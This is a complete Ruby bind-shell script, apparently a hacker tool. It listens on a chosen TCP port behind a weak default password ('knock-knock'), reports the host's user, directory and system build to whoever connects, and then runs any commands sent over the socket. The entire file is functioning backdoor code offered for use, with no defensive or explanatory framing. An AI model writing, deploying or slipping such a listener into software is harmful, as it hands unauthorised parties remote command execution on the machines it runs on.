#!/usr/bin/env ruby
# Ruby Bind Shell
# By: Hood3dRob1n
#
# ./bind.rb PORT (PASS)
#
require 'socket'
require 'open3'

#Add some color without colorize gem since we sticking to std libs :)
RS="\033[0m"    # reset
HC="\033[1m"    # hicolor
FRED="\033[31m" # foreground red
FGRN="\033[32m" # foreground green
FWHT="\033[37m" # foreground white

def cls #A quick method to clear the whole terminal
	if RUBY_PLATFORM =~ /win32/
		system('cls')
	else
		system('clear')
	end
end

def randz
	(0...1).map{ ('0'..'3').to_a[rand(4)] }.join
end

def help(message) #Exit strategy when shit goes sideways
	cls
	puts
	puts "#{message}" #print message passed when called
	#print example of usage sicne they obviously dont understand how this simple script works :p
	puts "#{HC}#{FGRN}EX#{FWHT}: #{$0} PORT #{FRED}(#{FWHT}PASS#{FRED})#{RS}"
	puts "#{HC}#{FGRN}\t=> #{FWHT}Default Pass is '#{FGRN}knock-knock#{FWHT}' if none is provided#{RS}"
	puts
	exit 666;
end

def bindshell
	#The number over loop is the port number the shell listens on.
	Socket.tcp_server_loop("#{PORT}") do |socket, client_addrinfo|
		command = socket.gets.chomp
		if command.downcase == "#{PASS}"
			socket.puts "\n#{HC}#{FGRN}You've Been Authenticated#{FWHT}!#{RS}\n"
			socket.puts "#{HC}#{FGRN}This Bind connection brought to you by a little Ruby Magic#{FWHT} xD#{RS}\n"
			socket.puts "#{HC}#{FGRN}Type #{FWHT}EXIT#{FGRN} or #{FWHT}QUIT#{FGRN} to temporarily leave shell & keep port open listening#{FWHT}...#{RS}"
			socket.puts "#{HC}#{FGRN}Type #{FWHT}KILLZ#{FGRN} or #{FWHT}CLOSE#{FGRN} to close port & shell for good#{FWHT}!\n#{RS}"
			socket.puts "#{HC}#{FGRN}Server Info#{FWHT}:#{RS}"
			begin
				count=0
				if RUBY_PLATFORM =~ /win32/ #First we scrape some basic info based on platform type....
					while count.to_i < 3
						if count.to_i == 0
							command="whoami"
							socket.print "#{HC}#{FGRN}ID#{FWHT}: #{RS}"
						elsif count.to_i == 1
							command="chdir"
							socket.print "#{HC}#{FGRN}PWD#{FWHT}: #{RS}"
						elsif count.to_i == 2
							command="echo Winblows"
							socket.print "#{HC}#{FGRN}BUILD#{FWHT}: #{RS}\n"
						end
						count += 1
						Open3.popen2e("#{command}") do | stdin, stdothers |
							IO.copy_stream(stdothers, socket)
						end
					end
				else
					while count.to_i < 3
						if count.to_i == 0
							command="id"
							socket.print "#{HC}#{FGRN}ID#{FWHT}: #{RS}"
						elsif count.to_i == 1
							command="pwd"
							socket.print "#{HC}#{FGRN}PWD#{FWHT}: #{RS}"
						elsif count.to_i == 2
							command="uname -a"
							socket.print "#{HC}#{FGRN}BUILD#{FWHT}: #{RS}\n"
						end
						count += 1
						Open3.popen2e("#{command}") do | stdin, stdothers |
							IO.copy_stream(stdothers, socket)
						end
					end
				end
				#Then we drop to sudo shell :)
				@work=Dir.pwd #var for keeping a working path so 'cd' works (for the most part)
				while(true)
					socket.print "\n#{HC}#{FWHT}(#{FGRN}GreenShell#{FWHT})#{FGRN}>#{RS}"
					command = socket.gets.chomp
					if command.downcase == 'exit' or command.downcase == 'quit'
						socket.puts "\n#{HC}#{FGRN}got r00t#{FWHT}?#{RS}\n\n"
						break #Exit when asked nicely :p
					end
					if command.downcase == 'killz' or command.downcase == 'close'
						socket.puts "\n#{HC}#{FGRN}got r00t#{FWHT}?#{RS}\n\n"
						exit #Exit when asked nicely :p
					end
					if command.downcase =~ /cd (.+)/i #our mini block to handle change directory requests
						Dir.chdir("#{$1}") do |dir|
							@work = Dir.pwd
						end
					end
					#Use open3 to execute commands as we read and write through socket connection
					Open3.popen2e("cd #{@work} && #{command}") do | stdin, stdothers |
						IO.copy_stream(stdothers, socket)
					end
				end
			rescue
				socket.write "#{HC}#{FRED}Command or file not found#{FWHT}!\n#{RS}"
				socket.write "#{HC}#{FRED}Type #{FWHT}EXIT#{FRED} or #{FWHT}QUIT#{FRED} to exit the shell#{FWHT}.\n#{RS}"
				socket.write "#{HC}#{FRED}Type #{FWHT}KILL#{FRED} or #{FWHT}CLOSE#{FRED} to kill the shell completely#{FWHT}.\n#{RS}"
				socket.write "\n\n"
				retry
			ensure
				@cleared=0
				socket.close
			end
		else
			num=randz
			socket.puts @greetz[num.to_i]
		end
	end
end

PORT = ARGV[0] || help("#{HC}#{FRED}Please re-run script with necessary options provided as argument(s)#{FWHT}!#{RS}") #confirm argument passed
PASS = ARGV[1] || "knock-knock" ### THIS IS PASSWORD TO ENTER UPON CONNECTION, PASS as ARGUMENT AFTER PORT OR HARD-CODE IT HERE ###
trap("SIGINT") {puts "\n\n#{HC}#{FRED}WARNING! CTRL+C Detected closing Socket Port#{FWHT}.....#{RS}"; exit 666;}
@greetz=["#{HC}#{FGRN}Piss Off#{FWHT}!#{RS}", "#{HC}#{FGRN}Grumble, Grumble#{FWHT}......#{FGRN}?#{RS}", "#{HC}#{FGRN}Run along now, nothing to see here#{FWHT}.....#{RS}", "#{HC}#{FGRN}Who's There#{FWHT}?#{RS}"]
bindshell
